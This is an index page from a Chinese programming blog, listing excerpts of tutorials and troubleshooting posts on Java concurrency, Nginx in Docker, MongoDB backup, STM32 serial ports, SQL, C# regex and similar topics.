public class ThreadPoolUtils { public static ThreadPoolExecutor pool=null; // 无响应执行 public static void execute(Runnable runnable){ getThreadPool().execute(runnable); } // 有响应执行 public static&lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; callable){ return getThreadPool().submit(callable); } // 创造线程池 private static synchronized ThreadPoolExecutor getThreadPool(){ if(pool==null){ // 获取处理器数量 int cpuNum = Runtime.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/826a2f3d7389c4c4a6eda2420cc4fa77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b251e761db0df6ac8210027e83b903a/" rel="bookmark">
			【深度学习-数据加载优化-训练速度提升一倍】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，介绍 数据加载
深度学习的训练，简单的说就是将数据切分成batch，丢入模型中，并计算loss训练。其中比较重要的一环是数据打batch部分（数据加载部分）。
训练时间优化：
深度学习训练往往需要大量的数据，训练过程也比较慢，常见的提升训练速度的方法包括：数据加载优化、模型计算优化、fp16半精度训练、加大batch、多卡训练等方法。这篇文章主要介绍从数据加载的思路提升训练速度。
结论：
数据加载优化后，可以提升1倍以上的训练速度。
2，数据加载流程 数据加载一般分为四步： 从文本中读取数据，并处理成想要的格式。（比如分类任务，就需要输入+label的格式）将读取的输入，转换成模型的输入feature。（nlp中一般是把文本切分成token）创建：dataset、dataloader、sampler。（数据的采样方式，打batch的方式）遍历训练数据，并训练 数据优化在第二步、已经第三步中。具体如下 examples, label_list = get_data(data_dir=file_dir) # 构建 feature features = convet_text_feature(examples) # 构建 dataset、dataloader、sampler train_dataset = ClassifyDataset(features, examples) train_sampler = SequentialSampler(train_dataset) train_dataloader = DataLoader( train_dataset, sampler=train_sampler, batch_size=4, collate_fn=torch.Tensor) # 获取训练数据 for step, batch in enumerate(train_dataloader): print(batch.shape) 3, 简单版本 （完整代码：https://github.com/xxyliuyang/yl_nlp/blob/main/data_load_opt/simple.py）
数据转换成feature步骤：将文本切词并转换成token id；之后，一次性将所有数据padding成最大长度。 def convet_text_feature(examples): tokenizer = AutoTokenizer.from_pretrained(tokenize_model) features = [] for example in examples['train']: ids = tokenizer.convert_tokens_to_ids(tokenizer.tokenize(example.text_a, add_special_tokens=True)) features.append(ids) # pad length = [len(ids) for ids in features] max_length = max(length) for i, feature in enumerate(features): features[i] = feature + [tokenizer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b251e761db0df6ac8210027e83b903a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44a0ad5da902726c97a7d60d5a815111/" rel="bookmark">
			如何将 Java 对象转换为 JSON？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要将 Java 对象或 POJO （普通旧 Java 对象）转换为 JSON，我们可以使用JSONObject将对象作为参数的构造函数之一。在下面的示例中，我们将StudentPOJO 转换为 JSON 字符串。Student类必须提供 getter 方法，JSONObject通过调用这些方法创建 JSON 字符串。
在此代码段中，我们执行以下操作：
使用 setter 方法创建Student对象并设置其属性。创建JSONObject调用object并将Student对象用作其构造函数的参数。JSONObject使用 getter 方法生成 JSON 字符串。调用object.toString()方法获取 JSON 字符串。 import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.ObjectMapper; import com.google.gson.Gson; import org.json.JSONObject; import java.util.Arrays; public class PojoToJSON { public static void main(String[] args) throws JsonProcessingException { Student student = new Student(); student.setId(1L); student.setName("Alice"); student.setAge(20); student.setCourses(Arrays.asList("Engineering", "Finance", "Chemistry")); JSONObject object = new JSONObject(student); String json = object.toString(); System.out.println(json); System.out.println(new Gson().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44a0ad5da902726c97a7d60d5a815111/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acac9f12535e4f03c56eefc02fb58afa/" rel="bookmark">
			Nginx安装及部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Nginx简介和安装
1.Nginx是什么？
高性能的http服务器/反向代理服务器及电子邮件代理服务器。官⽅测试 nginx 能够⽀⽀撑 5 万并发链接，并且 cpu、内存等资源消耗却⾮常低，运⾏⾮常稳定。
2.Nginx可以提供的服务
web服务、负载均衡(反向代理)、web cache（web缓存）
3.nginx的优点
1.高并发。静态小文件
2.占用资源少。2万并发、10个线程，内存消耗几百M。
3.功能种类比较多。web,cache,proxy。每一个功能都不是特别强。
4.支持epoll模型，使得nginx可以支持高并发。
5.nginx 配合动态服务和Apache有区别。（FASTCGI 接口）
6.利用nginx可以对IP限速，可以限制连接数。
7.配置简单，更灵活。
4.Nginx的安装(本文采用的是docker命令下安装nginx)
1.docker search nginx 搜索镜像
2.docker pull nginx拉取nginx镜像
3.创建容器，设置端口映射，目录映射
# 在 /root ⽬录下创建 nginx ⽬录⽤于存储 nginx 数据信息 mkdir ~/nginx cd ~/nginx mkdir conf cd conf # 在 ~/nginx/conf/ 下创建 nginx.conf ⽂件 , 粘贴下⾯内容 vim nginx.conf user nginx; worker_processes 1 ; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024 ; } http { include /etc/nginx/mime.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acac9f12535e4f03c56eefc02fb58afa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1d6eab6c4a9a2e7177c23024c0b5f2b/" rel="bookmark">
			【Python】Xpath 解析报错 ：lxml.etree.XPathEvalError: Unregistered function
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错 Traceback (most recent call last): File "F:\python3.7.0\lib\code.py", line 90, in runcode exec(code, self.locals) File "&lt;input&gt;", line 1, in &lt;module&gt; File "G:\Projects\pycharmeProject-C21\PyCharm Community Edition 213.5605.23\plugins\python-ce\helpers\pydev\_pydev_bundle\pydev_umd.py", line 198, in runfile pydev_imports.execfile(filename, global_vars, local_vars) # execute the script File "G:\Projects\pycharmeProject-C21\PyCharm Community Edition 213.5605.23\plugins\python-ce\helpers\pydev\_pydev_imps\_pydev_execfile.py", line 18, in execfile exec(compile(contents+"\n", file, 'exec'), glob, loc) File "G:/Projects/pycharmeProject-C21-3-1/Scrapy/python爬虫_第5章/Chapter_5_xpath_special.py", line 21, in &lt;module&gt; content = selector.xpath('//div[start-with(@id,"test")]/text()') File "src\lxml\etree.pyx", line 1597, in lxml.etree._Element.xpath File "src\lxml\xpath.pxi", line 305, in lxml.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1d6eab6c4a9a2e7177c23024c0b5f2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e480e55d00f16053b2ef766e65ef160/" rel="bookmark">
			拷贝mongodb数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在mongodb 4.2之后，拷贝mongodb数据库只有一种方法：mongodump和mongorestore
准备环境：linux的mongodb安装好之后就自带mongodump工具。windows的话需要去下载工具mongodb-database-tools，解压缩即可用。导出某个mongo里面的aaa数据库：mongodump mongodb://admin:123456@202.63.51.1:13198/?authSource=admin&amp;readPreference=primary&amp;ssl=false --archive=ddd --db=aaa把刚才导出的数据导入到另一个mongo去：mongorestore mongodb://admin:567890@202.63.51.22:16497/?authSource=admin&amp;readPreference=primary&amp;ssl=false --archive=ddd说明：导入和导出都可以指定mongodb连接字符串，所以导入导出都可以远程进行。参数--archive很重要，打包的文件里面会包含db名称。参见： 拷贝克隆mongo数据库 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/602e57337ef8e286620fac79c500ecce/" rel="bookmark">
			220301
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、编写程序，实现从键盘上任意输入一个正整数，求该数的因子和（注：1和其本身不是该数的因子）并输出结果。
样例输入：10
样例输出：7
说明：10 的因子为: 2，5
# include &lt;iostream&gt; using namespace std; int main() { //任意输入正整数，求因子之和 int a; cin&gt;&gt;a; int i,sum=0; for(i=2;i&lt;=a/2;i++) { if(a%i==0) sum+=i; } cout&lt;&lt;sum; return 0; } 二、编写程序，实现以下功能：从键盘输入一个学生的分数,
如果分数大于100，输出"Input error!";
如果分数介于100到90（包含等于90）之间, 输出"Very Good!";
如果分数介于80到90之间（包含等于80）,输出"Good!";
如果分数介于70到80之间（包含等于70）,输出"Middle"
如果分数介于60到70之间（包含等于60）,输出"Pass"
如果分数小于60,输出"No Pass!"。
# include &lt;iostream&gt; using namespace std; int main() { //键盘输入一个学生的分数 int n; cin&gt;&gt;n; if(n&gt;100) cout&lt;&lt;"Input error!"; else if(n&gt;=90) cout&lt;&lt;"Very Good!"; else if(n&gt;=80) cout&lt;&lt;"Good!"; else if(n&gt;=70) cout&lt;&lt;"Middle"; else if(n&gt;=60) cout&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/602e57337ef8e286620fac79c500ecce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28bb43bddd913b70ae6c9f2679d215f6/" rel="bookmark">
			AtomicInteger原子类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述： java从JDK1.5开始提供了java.util.concurrent.atomic包(简称Atomic包)，
这个包中的原子操作类提供了一种用法简单，性能高效，线程安全地更新一个变量的方式。
使用原子类，性能高效，线程安全。
AtomicInteger 原子型Integer，可以实现原子更新操作
public AtomicInteger () 初始化一个默认值为0的原子型Integer public AtomicInteger (int initialValue) 初始化一个指定值的原子型Integer int get()	获取值 int getAndIncrement() 以原子方式将当前值加1，先取再加；自增1 int incrementAndGet() 以原子方式将当前值加1，先加再取；先增1 int addAndGet (int data) 以原子方式将输入的数值与实例中的值相加，先增加一个量值。 int getAndset(int value) 以原子方式设置为newValue的值，并返回旧值。 public class VolatileAtomicDemo03 { public static void main(String[] args) { Runnable target = new MyRunnable03(); for(int i = 1 ; i &lt;=100;i++){ //启动100个线程，执行100次任务 new Thread(target).start(); } } } class MyRunnable03 implements Runnable{ //创建一个integer更新的原子类，默认值为0 private AtomicInteger atomicInteger = new AtomicInteger(); //一次任务是一个整体，加100 @Override public void run() { for (int i = 1 ; i &lt;=100;i++){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28bb43bddd913b70ae6c9f2679d215f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/063af5ba72e5a10bf82bc8cd98621bba/" rel="bookmark">
			关于VMware USB arbitration Serve 服务无法启动的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 问题方法一方法二 问题 虚拟机插入U盘或者PA等其他USB设备时无法识别，经过一番查询发现是本机的VMware USB arbitration Serve 没有启动，然后
打开以后尝试启动VMware USB arbitration Serve，然而问题来了，会出现报错，我的错误代码是2，可能会有其他类型的报错，总之无法启动。检查路径以后找到对应.exe依然无法启动。
网上找的方法大多是关于AMD驱动（What？我电脑就不是AMD）以及改注册表这种办法，然而都没有奏效。如果情况相同可以尝试我给出的解决办法。
方法一 尝试安装hcman
net start hcman
结果很可能是无法识别，无效的名字
找到"C:\WINDOWS\System32\drivers"，查看是否有hcman.sys，如果没有则从别的电脑copy或者去网上找到这个文件。
接下来再尝试启动服务。
方法二 依然无法启动服务，这个时候不得不把目光放在VMWare重装这种方法上面，但VMWare本身卸载功能一言难尽，卸载重装会出现各种解决起来很困难的问题。所以可以尝试我下面的方法
net user administrator /active:yes
这时候再按下win+r键就可以找到管理员账户了，进入，找到卸载程序功能，找到VMWare，选择repair，之后repair就开始了，耐心等待一会，不出意外程序会卡在安装networ driver这个阶段。
此时，退回到原来的用户，尝试启动VMware USB arbitration Serve,会发现已经没有报错了。
之后，愉快的关掉管理员模式
net user administrator /active:no
重启，问题解决。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d74aca765d3783918fd1e4574ab32c23/" rel="bookmark">
			输入一个字符c，判断该字符是字母字符、数字字符还是其他字符，然后分别输出“Letter”、“Digit”或“Other”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 c=input() if c.isalpha(): print('Letter') elif c.isdigit(): print('Digit') else: print('Other') 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b77bedac2a7250ce6729bfabec0bf1ae/" rel="bookmark">
			输入寄送货物的重量w，根据某快递公司的运费计算方案，计算并输出快递运费p。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 w=float(input()) if w&lt;=2: p=7.5 print(p) else: p=(w-2)*1.8+7.5 print('{:.1f}'.format(p)) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de98361c93f1b46d805017353f6d47ee/" rel="bookmark">
			http的get请求如何传递一个对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：https://www.longkui.site/program/frontend/httpget/4366/
0.前言
以前前台往后台对象时，后台都用POST请求，前台有时候通过拼接参数传参，会显得比较长。所以考虑前台GET请求能否直接传递一个对象。
本文环境：前台angular 7.5.x + 后台SpringMVC
1.前台写法
getGovData() {
let param = {
“state”: “2”,
} let url = `/xxx/xxxx/list` this.http.get(url, { params: param }).subscribe((res: any) =&gt; { console.log("GET 请求", res) this.listOfData = res }) }
2.后台写法
@RequestMapping(value = “/list”, method = RequestMethod.GET)
@ResponseBody
public void queryAll(IndexStorageSave indexStorageSave){
}
注：IndexStorageSave 是实体类
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/666cbea0e3a7865f9c3ad97616b800c2/" rel="bookmark">
			bad magic number in ‘application‘: b‘\x03\xf3\r\n‘:
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原因 该问题是由缓存中python版本的差异冲突引起的。缓存以“ pycach ”的形式存储在文件名下，尝试查找这些文件并删除它们，然后再次尝试使用正确版本的 python 运行项目。
处理 Linux下一行命令就可以解决 find . -name \*.pyc -delete windows下有几种方法 一行命令
del *.pyc /s /a /q
Python脚本来解决
import os path = 'project-path' for prefix, dirs, files in os.walk(path): for name in files: if name.endswith('.pyc'): filename = os.path.join(prefix, name) os.remove(filename) 新建一个.gitignore，内容
*.pyc 执行 git add -A git commit -m 'blalala' 到别的目录克隆一下，pyc文件就没了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b66e0b3581bb1555bba2050ebea3b66e/" rel="bookmark">
			No module named ‘service‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：https://stackoverflow.com/questions/24089484/python-no-module-named-service-identity
解决办法： 第一步：https://pypi.org/project/service-identity/#files网站下载.whl文件。
第二步：cmd+r命令行面板，执行pip install service-identity语句。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17cd9e2fa488c3fe7d0b56d879cbfd7a/" rel="bookmark">
			STM32——串口不能进入空闲中断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 如题，USART2配置接受非空中断和空闲中断，但是中断处理函数中一直进不去空闲中断 问题代码配置 /** * @name ESP8266_Config * @brief 打开串口的接受中断和空闲中断 * @param 无 * @retval 无 * @auther 火红色祥云 * @time 20220104 */ void ESP8266_Config(void) { // //初始化串口 //GPIO端口设置 GPIO_InitTypeDef GPIO_InitStructure; USART_InitTypeDef USART_InitStructure; NVIC_InitTypeDef NVIC_InitStructure; RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);	//使能USART1，GPIOA时钟 RCC_APB1PeriphClockCmd(RCC_APB1Periph_USART2, ENABLE); //USART1_TX GPIOA.9 GPIO_InitStructure.GPIO_Pin = GPIO_Pin_2; //PA.9 GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz; GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AF_PP;	//复用推挽输出 GPIO_Init(GPIOA, &amp;GPIO_InitStructure);//初始化GPIOA.9 //USART1_RX	GPIOA.10初始化 GPIO_InitStructure.GPIO_Pin = GPIO_Pin_3;//PA10 GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IN_FLOATING;//浮空输入 GPIO_Init(GPIOA, &amp;GPIO_InitStructure);//初始化GPIOA.10 //Usart1 NVIC 配置 NVIC_InitStructure.NVIC_IRQChannel = USART2_IRQn; NVIC_InitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17cd9e2fa488c3fe7d0b56d879cbfd7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1214618f8875fbc29d63ebf04abda701/" rel="bookmark">
			STL之deque
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STL:: deque 一. deque简介 双端队列deque，与vector的最大差异在于：
一、deque运行常数时间对头端或尾端进行元素的插入和删除操作。
二、deque没有所谓的容器概念，因为它是动态地以分段连续空间组合而成随时可以增加一块新的内存空间并拼接起来。
虽然deque也提供随机访问的迭代器，但它的迭代器与list和vector的不一样，其设计相当复杂而精妙。因此，会对各种运算产生一定影响，厨房必要，尽可能的选择使用vetor而非deque。
二. deque核心类别设计(部分) 三. 内存模型 介绍:
deque在逻辑上看起来是连续的空间，内部确实是一段一段的定量连续空间构成。
一旦有必要在deque的前端或尾端增加新空间，deque会配置一段定量的连续空间，串联在整个deque的头部或尾部。
deque的设计大师最大的调整应该就是如何在这段分段的定量连续空间上还能维护其整体连续的假象，并提供其随机存取的接口，从而避开了像vector那样的“重新配置-复制-释放”开销三部曲。———这样一来，虽然开销降低，却提高了复杂的迭代器架构。
因此，deque数据结构的设计和迭代前进或后退等操作都非常复杂。
deque采用一块所谓的map（注意，不是stl里面的map容器）作为中控器，其实就是一小块连续空间，其中的每一个元素都是指针，指向另外一段较大的连续线性空间，称之为缓冲区。在后面我们将看到，缓冲区才是deque的存储空间主体。
当一个连续的内存块存储满之后first迭代器会重新指向_M_map的下一个内存位置
注:上图表示当前连续块已经存储满,
first迭代器的_M_node指针会重新指向 _M_map的下一个连续内存位置
四. deque的构造和析构函数 template &lt;class T, class Alloc = alloc, size_t BufSiz = 0&gt; class deque { ... public: // Basic types deque() : start(), finish(), map(0), map_size(0){ create_map_and_nodes(0); } // 默认构造函数 deque(const deque&amp; x) : start(), finish(), map(0), map_size(0) { create_map_and_nodes(x.size()); __STL_TRY { uninitialized_copy(x.begin(), x.end(), start); } __STL_UNWIND(destroy_map_and_nodes()); } // 接受 n:初始化大小, value:初始化的值 deque(size_type n, const value_type&amp; value) : start(), finish(), map(0), map_size(0) { fill_initialize(n, value); } deque(int n, const value_type&amp; value) : start(), finish(), map(0), map_size(0) { fill_initialize(n, value); } deque(long n, const value_type&amp; value) : start(), finish(), map(0), map_size(0){ fill_initialize(n, value); } 五.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1214618f8875fbc29d63ebf04abda701/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b52999e986ea7cddd1341b52b8beade9/" rel="bookmark">
			stm32 /*CH340串口使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 一、资料下载1、ch340驱动2、STM32串口下载软件（FLYMCU）3、XCOM串口助手4、stm32最小系统板资料 二、ch340样品介绍1、跳线选择2、安装驱动3、串口自检 三、ch340串口下载在stm32最小系统板的使用1、最小系统板介绍2、跳线设置3、线路连接4、MCUISP-FlyMcu配置5、测试现象 四、ch340串口下载在stm32最小系统板的使用总结 一、资料下载 1、ch340驱动 ch340驱动：
链接：https://pan.baidu.com/s/1FIRK5tu3EyrN5SMfUJeCKA
提取码：5mcs
2、STM32串口下载软件（FLYMCU） STM32串口下载软件（FLYMCU）：
链接：https://pan.baidu.com/s/1cW-h7Nr9NBe7LTmxBy1e1w
提取码：rt5p
3、XCOM串口助手 XCOM串口助手：
链接：https://pan.baidu.com/s/1ZP52FxgexF4-r4vnV7QuJQ
提取码：k8yb
4、stm32最小系统板资料 stm32最小系统板资料：
链接：https://pan.baidu.com/s/1wXLxQejmiVmrH7sExFNGTw
提取码：ehze
二、ch340样品介绍 1、跳线选择 2、安装驱动 3、串口自检 三、ch340串口下载在stm32最小系统板的使用 1、最小系统板介绍 2、跳线设置 ①BOOT0接0（GND），BOOT1无论高还是低还是悬空，都会执行FLASH内容；
②BOOT1接1，BOOT0接0，这一项是用于串口下载；
③BOOT1接1，BOOT0接1，执行内部RAM内容，不常用；
3、线路连接 4、MCUISP-FlyMcu配置 FlyMcu.exe是绿色软件，不用安装直接就能打开，打开他；
搜索串口，选择和ch340对应的串口；
在这里下载led PA0口闪烁的程序
5、测试现象 测试现象：程序可以下载进去，P0口led不停闪烁；
四、ch340串口下载在stm32最小系统板的使用 总结 提示：这里对文章进行总结：
例如：以上就是今天要讲的内容，本文仅仅简单介绍了pandas的使用，而pandas提供了大量能使我们快速便捷地处理数据的函数和方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba78c7bfa2b5e90933a7271ab5235362/" rel="bookmark">
			【pyqt5学习】——groupBox显示matplotlib图像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、导入模块
二、创建matplotlib窗口类
三、qt_designer设计窗口
四、逻辑代码
五、结果展示
一、导入模块 import matplotlib matplotlib.use("Qt5Agg") from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg from matplotlib.figure import Figure from matplotlib import pyplot pyplot.rcParams['font.sans-serif'] = ['SimHei'] pyplot.rcParams['axes.unicode_minus'] = False 二、创建matplotlib窗口类 # 重写一个matplotlib图像绘制类 class MyFigure(FigureCanvasQTAgg): def __init__(self,width=5,height=4,dpi = 100): # 1、创建一个绘制窗口Figure对象 self.fig = Figure(figsize=(width,height),dpi=dpi) # 2、在父类中激活Figure窗口,同时继承父类属性 super(MyFigure, self).__init__(self.fig) 三、qt_designer设计窗口 转换为py文件
# -*- coding: utf-8 -*- # Form implementation generated from reading ui file 'TDA_ShiftFlip.ui' # # Created by: PyQt5 UI code generator 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba78c7bfa2b5e90933a7271ab5235362/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a1142213a90f003b0b62950c8c8ed87/" rel="bookmark">
			SQL的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们开始学SQL之前，要先了解SQL到底是什么
SQL 是什么？
SQL 就是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除（增删查改），数据库模式创建和修改，以及数据访问控制。
这一篇先从SQL简单的开始
首先SQL除了特定对象（比如你要引用哪一张表）外都不区分大小写
1.查询数据
Select * from table_name t1 从table_name中返回所有数据
*代表所有，也可以返回其它数据，当有俩个以上中间用逗号隔开
table_name是在FROM子句中指定源表及其模式名称，当没有模式名称时默认为dbo模式，t1为列表的别名，你可以用table_name或t1
执行上面这段语句时，先执行from子句，再执行select子句
2.排序数据(Order by)
默认为升序（asc）,从低到高。如果要降序就写（desc），从高到低
也可以按多列对结果集进行排序，但要在列之间用逗号隔开，也可以用升降序来排，例：order by name,id desc 根据名字的升序来排序，如果有相同的名字就再根据id的降序来排序
Len()函数返回字符串的字符数（长度）来排序
如果你想要排序的列没在选择列表中，也是没有问题的，但一定要在from子句中有的
按列的序数位置排序，就是用数字根据select子句的列来排序
例：select name，id from table order by 1，2先排name再排id
限制返回行数 由于存储在表中的行的顺序是不可预测的，因此 SELECT TOP 语句始终与 ORDER BY 子句一起使用。
返回固定行数 top 1，返回1行数据。Select top 1 * from table
返回百分比行数top 10 PERCENT，返回百分之10，假设有101行数据，因为返回的有小数，所以实际返回有11行数据，SQL将其进到下一个整数
TOP 5 WITH TIES 返回5行数据，如果有和第5行数据相同的就一起返回，所以可能返回的有5行也可能超过5行
Offset Fetch子句
OFFSET 和 FETCH 子句是 ORDER BY 子句的选项。它们用于限制查询返回的行数。必须将 OFFSET 和 FETCH 子句与 ORDER BY 子句一起使用 ，OFFSET 和 FETCH 子句比实现 TOP 子句更适合实现查询分页解决方案，OFFSET 子句是必需的，而 FETCH 子句是可选的。 此外， FIRST 和 NEXT 是同义词，因此可以互换使用它们
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a1142213a90f003b0b62950c8c8ed87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee5fd8faffc86247fbaa022d14442bfa/" rel="bookmark">
			hdrp-延迟渲染-gbuffer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GBufferManager gbuffer在HDRenderPipeline构造的时候会创建GBufferManager，默认会构造指定数量的gbuffer的rt，一般是4张rt加一张深度rt。
RenderGBuffer 在ExecuteRenderRequest中执行RenderGBuffer，然后执行
CoreUtils.SetRenderTarget(cmd, m_GbufferManager.GetBuffersRTI(hdCamera.frameSettings), m_SharedRTManager.GetDepthStencilBuffer());来通过commandbuffer渲染。
以及执行m_GbufferManager.BindBufferAsTextures(cmd);来绑定buffer到commandbuffer的texture中。
ShaderPassGBuffer 执行到shader中是Lit.shader的GBuffer的pass中。核心在ShaderPassGBuffer.hlsl这个shader中做，他有两个版本，一个是会用细分着色的，一个是只用顶点和片元的。
顶点着色： 然后在vert中主要做一些顶点数据准备，比如世界坐标，世界法线，切线以及uv，颜色等。然后vert中的PackVaryingsType就会区分是细分还是直接转片元。PackVaryingsToPS是直接转到片元。
片元： 然后是Frag，GetSurfaceAndBuiltinData是在LitData.hlsl中，是获取表现信息的地方，比如像素的法线，基础颜色，高光遮蔽，粗糙度，金属度等。
然后ENCODE_INTO_GBUFFER，在MaterialGBufferMacros.hlsl中执行EncodeIntoGBuffer执行到Lit.hlsl的EncodeIntoGBuffer，核心是对四个buffer赋值。
分别是
outGBuffer0为基础颜色级高光遮蔽，
outGBuffer1是法线以及a通道是粗糙度
outGBuffer2是高光遮蔽及厚度，或者是各向异性及金属度，或者是菲涅尔，根据用的材质决定。
outGBuffer3是自发光或者是环境光。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/811dc0421c51baae9298a9fcbb83822b/" rel="bookmark">
			C# 正则表达式使用_C# Regex使用整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、C# 正则表达式使用整理
常用操作：判断，匹配，替换，切割
在C#中使用正则表达式主要是通过Regex类来实现。命名空间：using System.Text.RegularExpressions。
其中常用方法：
名称说明IsMatch(String, String)指示 Regex 构造函数中指定的正则表达式在指定的输入字符串中是否找到了匹配项。Match(String, String)在指定的输入字符串中搜索 Regex 构造函数中指定的正则表达式的第一个匹配项。Matches(String, String)在指定的输入字符串中搜索正则表达式的所有匹配项。Replace(String, String)在指定的输入字符串内，使用指定的替换字符串替换与某个正则表达式模式匹配的所有字符串。Split(String, String)在由 Regex 构造函数指定的正则表达式模式所定义的位置，拆分指定的输入字符串。 二、使用案例Demo
/// &lt;summary&gt; /// 正则表达式 js,c,C#，java /// 字符串处理，查找，匹配，替换,拆分 /// &lt;/summary&gt; static void Test2() { string str1 = "1234#abcd5678#ert@www.jnqianle.cn*A"; //str1.Split(new char[] { ',','，'}); //判断是否有数字 string patten = @"@|\.|\*"; //核心内容 // Console.WriteLine(Regex.IsMatch(str1, patten)); //匹配数字 //patten = @"\D"; // Console.WriteLine(Regex.Match(str1, patten)); //匹配多个 //foreach (var item in Regex.Matches(str1, patten)) //{ // Console.WriteLine(item.ToString()); //} //替换 //Console.WriteLine(Regex.Replace(str1, patten,"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/811dc0421c51baae9298a9fcbb83822b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/289/">«</a>
	<span class="pagination__item pagination__item--current">290/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/291/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
